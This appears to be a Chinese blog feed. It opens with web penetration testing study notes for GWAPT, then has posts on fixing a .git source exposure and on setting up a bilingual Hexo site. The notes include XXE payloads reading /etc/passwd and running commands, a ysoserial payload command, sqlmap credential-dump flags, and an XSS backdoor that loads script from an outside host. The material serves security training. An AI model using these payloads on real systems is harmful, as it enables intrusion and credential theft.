<h2 id="Username-Harvesting"><a href="#Username-Harvesting" class="headerlink" title="Username Harvesting"></a>Username Harvesting</h2><p>通过猜测地方法破解账户需要猜测用户名再猜测密码： 猜测用户名往往是第一步<br>尝试登陆：有时候网络应用对存在&#x2F;不存在的用户名返回不同的响应，通过对比不同的响应，可以判断出用户名是否存在 (这里的不同可能很明显的显示在页面上，也有可能只是HTTP返回包中的细微差别-&gt; Burp Comparer)</p>
<p>如果完全一致，可以尝试”忘记密码“页面。</p>
<p>Side-Channel Attacks<br>有时候应用程序遇到正确的用户名会计算密码的哈希值进行校验，而遇到错误的用户名则会立刻返回错误。<br>如果用好了Slow-Hash的方式，那么这里就存在了一个可以被发现的区别来判断用户名的正确与否</p>
<h2 id="Burp-Intruder"><a href="#Burp-Intruder" class="headerlink" title="Burp Intruder"></a>Burp Intruder</h2><p>有四种模式：<br>Sniper: 每次在同一个field中尝试一种Payload<br>Battering Ram: 每次在多个field中同时尝试同一种payload<br>Pitchfork: 往往最少用到， 每次在多个field中同时尝试一组数据集<br>Cluster Bomb: 尝试数据集中的所有组合。</p>
<h1 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h1><h2 id="Session-Management"><a href="#Session-Management" class="headerlink" title="Session Management"></a>Session Management</h2><p>通过应用或者服务器来实现。需要认真检查，防止未授权访问的产生<br>Session ID 可以在 Cookies, POST的隐藏表单，自定义HTTP头，URI参数中找到。<br>常用的种类： JSESSIONID，PHPSESSID，ASP.NET_SessionID<br>如果是非常用的SessionID种类，可以通过退出重新登陆后比较参数来发现</p>
<p>session ID 需要具备的性质： 不可预测性，防止篡改，会过期，保密性。<br>在Cookie中实现是最常见的方式</p>
<p>不可预测性: 增加熵 –&gt; 长度，字符种类，算法复杂度<br>防止篡改： 网路应用需要可以有能力检查出某一个sessionID是否真实有效<br>                确保sessionID在每次登陆后都会更改， 对于安全性要求非常高的应用而言，需要在每个页面刷新时都更新SessionID<br>                高敏感度的功能在操作时需要检查其他与SessionID相关联的属性：如Referer, User-Agent, src IP<br>过期策略： 登出后需要立刻过期，服务器的响应不应该再包含有过期的SessionID，包含过期SessionID的客户端响应需要被无视或者强制重定向到登陆页面<br>Session应该在以下情况下过期： 用户点击了logout，超过了有效时间，检测到了session篡改的企图。</p>
<p>保密性: Session ID 应当加密传输，在Cookie中也应该启用Secure Flag选项</p>
<h2 id="Session-Attack"><a href="#Session-Attack" class="headerlink" title="Session Attack"></a>Session Attack</h2><p>开发时 (开发安全) 对于Session管理的实现，应该参照OWASP的Session Management Cheat Sheet. </p>
<p>测试可预测性：<br>获取SessionID，检查是否可靠。<br>工具： BurpSuite Sequencer; Google; 人工观察…</p>
<p>Session Fixation: SessionID不应该在用户登陆前就被设定好。<br>观察 SessionID在用户登陆后是否发生变化； 创建一个SessionID，然后再进行登陆，观察是否变化。<br>否则攻击者可以选定一个SessionID，通过社会工程攻击诱骗用户点击存有预设SessionID的链接进行登陆，登陆成功后，攻击者就可以使用这个SessionID进行需要授权的操作。</p>
<p>Session theft<br>XSS 漏洞可能会让攻击者获取到SessionID. HTTPOnly flag可以防止攻击者通过JS获取到cookie中的sessionID</p>
<p>Session Logout<br>尝试登出后再使用先前的session ID</p>
<h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><p>OTG-AUTHN-004</p>
<p>逐个页面测试没有登陆的用户能否访问。</p>
<h2 id="Authorization-Bypass"><a href="#Authorization-Bypass" class="headerlink" title="Authorization Bypass"></a>Authorization Bypass</h2><p>OTG-AITJZ-002; OTG-AUTHZ-003; OTG-AUTHZ-004</p>
<p>逐个页面测试是否有admin页面可以被普通用户访问<br>需要拥有两个不同权限的账号</p>
<p>如果同一个SessionID但是不同的uid，登陆后如果指向不同的用户，则说明存在问题</p>
<p>IDOR - Insecure Direct Object Reference<br>可以通过用户输入的参数直接访问到网页的资源：PDF，图片，等… </p>
<h2 id="Mutillidae"><a href="#Mutillidae" class="headerlink" title="Mutillidae"></a>Mutillidae</h2><p>故意设计存在漏洞的网络应用</p>
<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>OTG-INPVAL-013</p>
<p>这类漏洞会在网页使用用户输入作为系统命令时产生。 </p>
<p>利用：<br>读取文件 &#x2F;etc&#x2F;passwd&#x2F; C:\Windows\win.ini ； ping自己的一个服务器   –&gt; 判断存在<br>创建远程shell登陆</p>
<h2 id="File-Inclusion-and-Directory-Traversal"><a href="#File-Inclusion-and-Directory-Traversal" class="headerlink" title="File Inclusion and Directory Traversal"></a>File Inclusion and Directory Traversal</h2><p>OTG-INPVAL-012</p>
<p>利用后可以：</p>
<ul>
<li>应用配置文件</li>
<li>系统配置文件</li>
<li>源代码</li>
<li>事件日志</li>
<li>用户配置文件</li>
<li>用户文档</li>
</ul>
<p>RFI 从远程的其他服务器包含文件，危害更大</p>
<h2 id="Insecure-Deserialization"><a href="#Insecure-Deserialization" class="headerlink" title="Insecure Deserialization"></a>Insecure Deserialization</h2><p>Marshalling pickles</p>
<p>可能存在于任何面向对象的语言，最常见于Java</p>
<p>开发者经常会序列化一个对象，更容易作为参数进行传输，反序列化后，服务器端的内存中可以得到一个完全相同的对象。<br>但是攻击者可以在客户端篡改这个对象</p>
<p>使用序列化的技术：</p>
<ul>
<li>Remote Method Invocation (RMI)</li>
<li>Java Management Extension (JMX)</li>
<li>Java Message Service (JMS)</li>
<li>Java Server Faces Implementation (ViewState)</li>
</ul>
<p>首先序列化后的数据容易被篡改。</p>
<p>利用： Ysoserial，包含了一组Java库中存在的gadget 链，来生成利用payload</p>
<p>Lab</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">java -jar <span class="regexp">/usr/</span>local<span class="regexp">/bin/y</span>soserial-master-SNAPSHOT.jar CommonsCollections5 <span class="string">&#x27;[bash command]&#x27;</span> </span><br><span class="line">| base64 -w0 &gt; payload.txt</span><br></pre></td></tr></table></figure>


<h2 id="SQL-Injection-Primer"><a href="#SQL-Injection-Primer" class="headerlink" title="SQL Injection Primer"></a>SQL Injection Primer</h2><p>原因： 网络应用需要SQL数据库来保存数据，应用同时还需要对SQL进行数据操作。</p>
<p>一些非常基础的SQL知识</p>
<h2 id="Discovering-SQLi"><a href="#Discovering-SQLi" class="headerlink" title="Discovering SQLi"></a>Discovering SQLi</h2><p><strong>所有的用户可以修改的值都可以成为SQLi的目标</strong></p>
<p>Inline SQLi: can see the error &#x2F; output<br>Blind SQLi: No detailed error message &#x2F; output</p>
<p>加上后缀观察输入的语句是否被作为SQL语句执行：<br>比较 Dent 与 Dent’;#   Dent’;–   De’&#x2F;**&#x2F;‘nt     De’’nt   De’||’nt   等输入的结果，如果一致的话，说明SQLi存在<br>同理还有加上 AND 1&#x3D;1观察结果是否被改变</p>
<h2 id="Exploiting-SQLi"><a href="#Exploiting-SQLi" class="headerlink" title="Exploiting SQLi"></a>Exploiting SQLi</h2><p>首先通过错误代码判断数据库类型，版本<br>information_schema 获得数据库的更多信息</p>
<p>对于显示输出的SQLi, 可以进行的利用：<br>Stacked Query, 通过分隔符，让数据库同时执行两句SQL语句   ; DROP TABLE<br>还可以UNION SELECT来获取其他表中的信息，但是需要列数相同…<br>所以需要进行一些次数的尝试。使用NULL</p>
<p>SQLMap</p>
<p>Read file<br><code>--file-read /etc/passwd</code></p>
<p>Dump the DB users and passwords<br><code>--users --passwords</code></p>
<p>search in Column names of “my_wiki” database<br><code>-D my_wiki --search -C pass</code></p>
<h1 id="XXE-and-XSS"><a href="#XXE-and-XSS" class="headerlink" title="XXE and XSS"></a>XXE and XSS</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XML是一种标签语言，常被用来做数据交换。</p>
<p>XXE (XML External Entity) 如果攻击者可以上传一段XML文件到服务器端，那么他们就有可能可以利用XML处理器的漏洞，来获得数据，执行命令，DOS攻击等等…</p>
<p>XML is an example of SSRF. Client tricks XML server to initiate requests to internal web server. </p>
<p>PoC: </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;It works!!!&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">auther</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Display local file: (LFI)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span><br></pre></td></tr></table></figure>

<p>Access URL:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://sec542.org/robots.txt&quot;</span> &gt;</span>]&gt;</span><br></pre></td></tr></table></figure>

<p>RCE via PHP:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br></pre></td></tr></table></figure>
<p>Require PHP ‘expect’ module to be enabled</p>
<p>XXE is often triggered via PHP. Cna’t be shown in Burp or ZAP as it’s server to server.<br>So it’s always blind , attacker cannot see the source code, cannot have any direct evidence.</p>
<h2 id="Document-Object-Model-DOM"><a href="#Document-Object-Model-DOM" class="headerlink" title="Document Object Model (DOM)"></a>Document Object Model (DOM)</h2><p>object-oriented representation of a web page.<br>Allow program to change a document’s structure, style and content. </p>
<p>Everything in HTML can be a part of DOM. –&gt; node in a tree. </p>
<p>Inspect the element through web browser… Developer tools</p>
<p>JavaScript is an object-oriented  language JS经常被用来操作DOM树。<br>内置的对象有：String, Date, Array 等。与HTML 相关: windows 和 document<br><code>Document.cookie</code></p>
<h2 id="XSS-Primer"><a href="#XSS-Primer" class="headerlink" title="XSS Primer"></a>XSS Primer</h2><p>OTG-CLIENT-003: HTML Injection<br>XSS 非常常见，并且相对于其他种类的漏洞，更难以防止。</p>
<p>原理就是在输入中包含HTML代码(JS)，然后在显示的时候被页面执行…</p>
<p>Same-Origin Policy (SOP) - 最为基础的网络安全组件 不允许其他域来访问自己的资源 【端口；协议；域名需要完全一致<br>SOP通过浏览器来实现</p>
<blockquote>
<p>Browser Security Handbook<br><a href="https://code.google.com/archive/p/browsersec/wikis/Main.wiki">https://code.google.com/archive/p/browsersec/wikis/Main.wiki</a></p>
</blockquote>
<p>但是对于Cookie而言，SOP相对来说没有那么严格。<br>外部的JS代码也可以修改本地的Cookie</p>
<p>渗透测试中，一般往往不会去尝试绕过SOP，利用浏览器的漏洞（非WEB范围）</p>
<p>在渗透测试中，不要使用Alert弹窗来说明XSS漏洞，需要用一些更有效的例子来解释漏洞。</p>
<h2 id="Classes-of-XSS"><a href="#Classes-of-XSS" class="headerlink" title="Classes of XSS"></a>Classes of XSS</h2><p>反射型；储存型；DOM型；<br>反射型：在URL中包含XSS的payload，但是要进行URL编码<br>储存型：博客评论，论坛数据，消息他功能，日志机制，账号信息…</p>
<h2 id="XSS-Discovery"><a href="#XSS-Discovery" class="headerlink" title="XSS Discovery"></a>XSS Discovery</h2><p>输入一段比较特殊的字符串，观察该字符串是否会在页面返回回客户端<br><code> &lt;&gt;()=&#39;&quot;/;[]&#123;&#125;$--#&amp;//</code><br><code>&lt;script&gt;alert(42)&lt;/script&gt;</code></p>
<p><code>&lt;img src=&quot;x&quot; onerror=alert(42); /&gt;</code><br><code>424242&quot; onload=&quot;alert(42)</code>   如果输入的值显示在某个HTML闭合标签的属性的值中<br>如果输入的字符串回显在JS代码标签中，则可以直接加入JS代码，但要注意闭合function</p>
<p>更多例子：<br><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a> </p>
<p>Fuzzdb &amp;&amp; JBroFuzz</p>
<h2 id="XSS-impacts"><a href="#XSS-impacts" class="headerlink" title="XSS impacts"></a>XSS impacts</h2><p>Session Abuse<br>steal cookie, and use location to send to remote location. (没有HTTPOnly flag)</p>
<p> 创建可交互式后门<br> <code>&lt;svg onload=setInterval(function()&#123;d=document; z=d.createElement(&quot;script&quot;);z.src=&quot;//sec542.org:1234&quot;; d.body.appendChild(z)&#125;,0)&gt;</code></p>
<h2 id="XSS-Tools"><a href="#XSS-Tools" class="headerlink" title="XSS Tools"></a>XSS Tools</h2><p> Burp: Battering Ram + Grep Payloads   查找是否有回显</p>
<ul>
<li><p>xsssniper<br> <code>xsssniper -u &quot;http://sec542.org&quot; --crawl --forms</code></p>
</li>
<li><p>XSSer</p>
</li>
<li><p>XSScrapy</p>
</li>
</ul>
<h2 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h2><p> BeEF hook 是一个JS文件，可以让浏览器变成一个僵尸节点</p>
<p> BeEF 控制器Ruby编写，像服务器一样运行，可以控制</p>
<p> 可以创建各种浏览器利用场景。</p>
<h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><p> 介绍略去<br> 通过XHR(XMLHttpRequest)实现。可以在后台发送链接来交换数据，同时不需要刷新整个页面</p>
<p> 非常难以发现所有的AJAX接口。Burp和ZAP现在提供了AJAX爬虫，但是不能要求太高。利用起来与普通的页面是一样的</p>
<p> JS frameworks: 可以从源代码中看出使用了哪种JS框架。<br> 通过检查版本，来判断是否存在漏洞。  Burp Retire.js</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h2 id="Logic-Attacks"><a href="#Logic-Attacks" class="headerlink" title="Logic Attacks"></a>Logic Attacks</h2><p> OTG-BUSLOGIC-001~9</p>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>Web Libraries: </p>
<ul>
<li>urillib, urllib2, urllib3, httplib, httplib2, <strong>Requests</strong></li>
</ul>
<h2 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a>WPScan</h2><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>最常被用来网络和系统利用，经常会被Web Application的渗透工程师忽视。但是其实有很多实用的模块可以使用。</p>
<p><code>msf &gt; search [keyword]</code> </p>
<ul>
<li><p>db_import<br>可以导入某些软件的输出文件 (XML)</p>
</li>
<li><p>WMAP<br>Metasploit的网络应用扫描插件</p>
</li>
</ul>
<p>-BeEF<br>通过BeEF可以hook被攻击者的浏览器，但是通过这种方式非常难以实现持久化，同时在系统层面也只能获得非常有限的权限。</p>
<p><code>/opt/beef/config.yaml</code> 中启用metasploit<br><code>msf &gt; load msgrpc ServerHost=127.0.0.1 Pass=[password]</code> 启动插件<br><code>/opt/beef/extensions/metasploit/config.yaml</code> 中，配置前面设定的密码<br><code> sudo /opt/beef/beef</code> </p>
<ul>
<li>Sqlmap &lt;-&gt; Metasploit<br>–os-pwn<br>–priv-esc</li>
</ul>
<h2 id="Drupal"><a href="#Drupal" class="headerlink" title="Drupal"></a>Drupal</h2><p> 非常广泛使用的CMS<br>但是功能模块中经常包含不少漏洞。 CMS本身也往往是渗透测试中的高价值对象。</p>
<h2 id="When-Tools-Fail"><a href="#When-Tools-Fail" class="headerlink" title="When Tools Fail"></a>When Tools Fail</h2><h2 id="Business-of-Pentesting-Preparation"><a href="#Business-of-Pentesting-Preparation" class="headerlink" title="Business of Pentesting: Preparation"></a>Business of Pentesting: Preparation</h2><ul>
<li>Preparation<br>Practice Lab: <a href="https://www.amanhardikar.com/mindmaps/Practice.html">https://www.amanhardikar.com/mindmaps/Practice.html</a><br>CTF Time：<br>Build own <a href="https://www.sans.org/blog/building-a-pen-test-lab-hardware-for-hacking-at-home-on-the-cheap/">https://www.sans.org/blog/building-a-pen-test-lab-hardware-for-hacking-at-home-on-the-cheap/</a><br><a href="https://pen-testing.sans.org/holiday-challenge/2012">https://pen-testing.sans.org/holiday-challenge/2012</a></li>
</ul>
<p>Toolkit: 准备好工具集：Kali</p>
<p>Permission; Scope; Rules of Engagement<br>攻击者的详细信息<br>白名单<br>测试账号 - 每个权限级别两个测试账号<br>确保存在备份</p>
<p>沟通交流: 拉上相关人员，IT，开发，运维，owner…；记录定期会议，确认哪个级别的漏洞会进行紧急沟通。确认最后结果的呈现形式，大多数情况是报告。<br>加密信息的传输方式；最后的结果交给哪些人</p>
<h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><p>PTES!! 非常好。<br>OTG<br>根据报告，任何一个技能达标的渗透测试人员应该可以重现漏洞。</p>
<p>Black Gray White</p>
<p>NIST800-30  Threat Modeling</p>
<p>Source Code Review </p>
<p>Pentesting</p>
<h2 id="Post-Assessment"><a href="#Post-Assessment" class="headerlink" title="Post Assessment"></a>Post Assessment</h2><p>考虑不同的读者：管理层，应用的赞助人对业务影响更感兴趣<br>开发者和IT技术人员需要更多的技术细节</p>
<p>Report (OTG v4)<br>Executive Summary (1-2 页): 时间，目标，结果的摘要，重点关注高危漏洞，确保建议能被目标对象有权利执行。</p>
<p>Test Parameter：</p>
<ul>
<li>目标Objective</li>
<li>范围 Scope</li>
<li>时间Schedule</li>
<li>Targets 应用名称，应用的技术和功能</li>
<li>Limitations 存在的困难和限制，声明</li>
<li>Finding的总结</li>
<li>解决方法 Remediation</li>
</ul>
<p>Findings<br>逐个列出发现的漏洞，截图，做了什么，测了什么，等级，改进方法</p>
<p>Appendices</p>
<ul>
<li>keybase.io  加密传输</li>
<li>某一个发现有多个URL</li>
<li>命令行输出</li>
<li>通过漏洞获取的数据</li>
<li>…</li>
</ul>
<p>Report Automation<br>缩减重复工作的时间，更好地在测试过程中记录下重要的信息</p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Certification</tag>
        <tag>GWAPT</tag>
      </tags>
  </entry>
  <entry>
    <title>Git配置文件泄漏的处理方法</title>
    <url>/zh-CN/55dd0f0b/</url>
    <content><![CDATA[<span id="more"></span>


<p>最近接连收到了几个扫描的报告，说是有几个网站存在Git配置文件泄漏的问题。所以记录一下对于这类事件的处理方法。</p>
<!-- more -->

<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>最近接连收到多个报告，说是网站的.git文件暴露在了互联网上，通过利用漏洞可以获取到源码和一些写死的数据库连接的帐密。  </p>
<p>Git仓库么，大家懂的都懂。但是怎么会出现这么低级的问题呢？什么？原来是业务部门自己找的vendor开发的系统？哦…那没事了…  </p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>这个漏洞应该是属于源代码泄漏。开发人员使用Git将代码从代码库部署到生产服务器上，但是却没有在发布代码时删除隐藏的.git路径。如果没有对.git文件夹做任何的访问控制，那么任何人都可以通过互联网访问、下载.git文件夹。由于.git文件夹中包含了非常多的代码信息，所以攻击者可以通过.git文件还原出许多源代码文件，获取到各类配置信息，敏感数据等。因此，这个漏洞虽然简单，但是也能造成非常严重的后果。</p>
<h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>既然收到了漏洞的报告。当然首先是对这个漏洞进行验证。</p>
<p>Github上有不少公开的GitDump工具，可以用来对存在.git泄漏的网站进行测试。这里我使用了这个<a href="https://github.com/internetwache/GitTools/tree/master/Dumper">Gitdumper</a>的脚本。</p>
<p>除此之外，还有一个国人开发的名为<a href="https://github.com/lijiejie/GitHack">GitHack</a>的工具，据说也不错。</p>
<p>反正都是使用起来很简单的工具，一行命令直接搞定。运行了一下以后发现，确实可以通过这个路径下载并恢复出大部分的源码文件。</p>
<p>再仔细看了一下，果然！数据库连接的帐密都可以在配置文件中找到…啧啧啧！</p>
<p>万幸的是，数据库还是有访问控制的，所以这个漏洞没有造成严重的后果。但是，这个案例也足够我们引起重视。</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>修复的方法也很简单：删除.git文件夹；或者至少增加访问控制，禁止访问.git路径。</p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Web Application</category>
        <category>Incident Response</category>
      </categories>
      <tags>
        <tag>GitDumper</tag>
        <tag>Access Control</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Hexo框架搭建中英文双语网站</title>
    <url>/zh-CN/78ced6ec/</url>
    <content><![CDATA[<h1 id="2020-4更新"><a href="#2020-4更新" class="headerlink" title="2020.4更新"></a>2020.4更新</h1><p>Next主题配置中，现在可以启用在页脚加入语言切换功能。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Show multilingual switcher in footer.</span></span><br><span class="line"><span class="attr">language_switcher:</span> <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="footer_switcher.png" alt="页脚语言切换"></p>
<hr>
<h1 id="2019-12更新"><a href="#2019-12更新" class="headerlink" title="2019.12更新"></a>2019.12更新</h1><p>对该方法进行了更新，文中引用的代码适用于Hexo v4.2.0, Next v7.7.0.<br>请各位根据自己的版本情况进行相应的微调。  </p>
<hr>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Hexo本身有对于博客国际化的多语言的支持。但 是简单倒腾后发现，所谓的国际化只是在显示文章时，根据文章设定的语言将导航栏，侧边栏中的链接名称改为相对应的语言。但博客本身的博文列表中，各个语言的文章仍然混杂在一起。</p>
<p>而我理想中的中英文双语站点可以通过一张图片非常形象的表示出来：<br><img data-src="bilingualize.png" alt="理想网站结构"></p>
<p>通过一段时间的搜索，我发现了两种较为可行的方法来实现这个功能。这里我挑选了一个我认为更加合理的方法来实现。</p>
<span id="more"></span>

<p>（另一种方法通过两套Hexo+NexT来实现。即构建中英文两个相互独立的Hexo站点。这样做的好处在于结构清晰，两种语言不存在互相干扰的可能。但缺点则是这样子相当于维护两套Hexo站点，每次生成都需要执行两次，致使操作相对繁杂。具体的实现方法详见：<a href="https://chenyxmr.github.io/2016/08/04/hexo-bilingual/%EF%BC%89">https://chenyxmr.github.io/2016/08/04/hexo-bilingual/）</a></p>
<p>好了，切入正题，接下来我将详细介绍基于hexo-generator-i18n插件的方法。</p>
<h1 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h1><h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p> 首先，安装hexo-generator-i18n插件。相信这条命令大家已经非常熟悉了。</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-i18n <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
<p>插件成功安装完成后，在Hexo的根目录中找到package.json文件，这个文件记录了已经安装的各个Hexo插件名称及版本号。在这个文件中将<code>hexo-generator-i18n</code>所在的这一行移动到<code>hexo-generator-</code>的最后一行。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;canvas-nest.js&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;gitment&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.7.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-asset-image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-deployer-git&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.3.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-generator-archive&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.1.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-generator-category&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.1.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-generator-index&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.2.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-generator-searchdb&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.0.8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-generator-tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.2.0&quot;</span><span class="punctuation">,</span>             </span><br><span class="line">  <span class="attr">&quot;hexo-generator-i18n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.7&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-neat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.0.4&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-renderer-ejs&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.3.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-renderer-marked&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.3.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hexo-renderer-stylus&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.3.3&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
<p><em>（根据观察，每次重新安装完插件的时候该文件会自动根据首字母重新排序,要记得修改顺序。）</em></p>
<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>首先修改Hexo根目录中的配置文件_config.yml的语言选项：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta">#language: </span></span><br><span class="line"><span class="meta">#- zh-CN</span></span><br><span class="line"><span class="meta">#- en</span></span><br><span class="line"><span class="symbol">language:</span> [zh-CN,en]</span><br><span class="line"><span class="symbol">i18n:</span></span><br><span class="line"><span class="symbol">  type:</span> [page, post]</span><br><span class="line"><span class="symbol">  generator:</span> [index, archive, category, tag]</span><br></pre></td></tr></table></figure>

<p>完成后保存并退出。尝试运行命令 <code>hexo clean &amp;&amp; hexo g</code> 重新生成public文件夹。<br>此时，public目录下应该会包含了一个新的目录&#x2F;en。 这个目录就是英文站相关文件所在的路径。每次执行<code>hexo g</code>命令时，所有的博文会在这两个文件目录中各生成一份。此时，如果我们访问网站时，已经可以通过访问 <a href="http://www.yourwebsite.com/en">www.yourwebsite.com/en</a> 来进入英文站点。但是，显而易见，在当前条件下，无论文章是以何种语言呈现，所有的文章都会在中英文网站中各出现一次。这显然也不是我们所希望得到的效果。因此，我们还需要找一个方法，让Hexo在生成页面时，根据文章的语言将其呈现在对应的页面中。</p>
<p><strong>注意</strong>: 对于NexT v6.0.0以后的版本，务必在主题配置文件中修改配置：  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>否则，在语言切换的过程中，菜单栏以及页脚的语言会出现问题。</p>
<h2 id="添加生成条件"><a href="#添加生成条件" class="headerlink" title="添加生成条件"></a>添加生成条件</h2><p>首先，在博文(post)的标题处加上lang:标识。简体中文博客标记为lang: zh-CN，英文版则是lang: en。</p>
<p>在 themes&#x2F;next&#x2F;layout&#x2F;index.swig文件中，为 </p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name"><span class="built_in">partial</span></span>(<span class="name">&#x27;_macro/post.swig&#x27;</span>, &#123;post: post, is_index: <span class="literal">true</span>&#125;) &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p> 添加判断条件。   (题外话：此处使用行内代码写包含<code>&#123;</code> <code>%</code> <code>%</code> <code>&#125;</code>这样的语句，会使渲染器尝试解析该断代码，并导致<code>Template render error:</code>这样的错误。我找到的<a href="https://hoxis.github.io/hexo-unexpected-token.html">相关解决方法</a>)<br>具体代码如下(<em>记得删除注释</em>)：</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">block</span></span> content %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;posts-expand&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%- <span class="name"><span class="name">for</span></span> post <span class="keyword">in</span> page.posts.toArray() %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> page.lang === post.lang %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123; partial(&#x27;_macro/post.swig&#x27;, 